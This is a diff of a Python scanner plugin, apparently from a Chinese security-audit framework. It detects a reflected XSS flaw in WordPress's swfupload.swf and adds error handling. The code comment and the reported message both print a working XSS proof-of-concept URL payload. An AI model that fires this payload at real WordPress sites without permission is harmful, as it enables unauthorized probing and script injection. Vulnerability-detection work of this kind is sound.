@@ -12,7 +12,7 @@
 # 漏洞证明： http://www.80sec.com/wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//
 # description-
 
-
+from dummy import *
 #
 # 1-通用常见漏洞
 # 2-敏感信息收集
@@ -28,9 +28,6 @@ import re
 import urlparse
 import md5
 
-def security_info(msg):
-    print msg
-    
 def assign(service,arg):
     #只适用于wordpress网站
     #此任务由cms识别插件产生,arg为网站url
@@ -41,9 +38,11 @@ def assign(service,arg):
 def audit(arg):
     url=arg
     #通过检查wordpress是否存在该url来识别是否存在xss
-    code,head,res,errcode,_=curl.curl(url+'wp-includes/js/swfupload/swfupload.swf')
+    code,head,res,errcode,_,errstr=curl.curl(url+'wp-includes/js/swfupload/swfupload.swf')
+    if errcode:
+        raise Exception(errcode,errstr)
     if code==200 and validate(res):
-        security_info('WordpressURLXSSExits!Try'+url+'wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//')
+        security_info('Wordpress URL XSS Exits!Try '+url+'wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//')
 
 
 def validate(res):
